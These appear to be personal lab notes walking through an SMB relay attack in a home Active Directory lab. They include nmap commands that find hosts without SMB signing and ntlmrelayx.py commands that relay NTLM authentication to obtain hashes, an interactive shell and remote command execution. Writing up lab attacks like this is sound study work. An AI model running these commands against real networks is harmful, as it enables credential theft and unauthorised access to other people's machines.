Always try to -Pn in the end cuz something it will not show the host even there are the host or something the ping might be blocked.

We can also swipe the whole network
```
nmap --script=smb2-security-mode.nse -p445 192.168.17.0/24 -Pn
```

![[Pasted image 20240120130552.png]]

Now we have to setup the NTLM relay

```
ntlmrelayx.py -tf ~root/HackTheBox/Active_Directory/target.txt -smb2support
```


Will trigger the event
```
\\192.168.17.136
```
![[Pasted image 20240120131350.png]]
![[Pasted image 20240122202733.png]]
Got the NTLM hash and the effect triggered from Peter parker pc cuz punisher is local admin in both the PC.

For a little twist i first try to relay with Peter Parker machine but failed in it but but but 
when i tried with fcastle i was able to get the relay as it is local admin on both the machine


![[Pasted image 20240120131959.png]]

```
ntlmrelayx.py -tf ~root/HackTheBox/Active_Directory/target.txt -smb2support -i
```
![[Pasted image 20240120151006.png]]

![[Pasted image 20240120150947.png]]

If we want to test if we are able to run a command or not
```
ntlmrelayx.py -tf ~root/HackTheBox/Active_Directory/target.txt -smb2support -c "whoami"
```
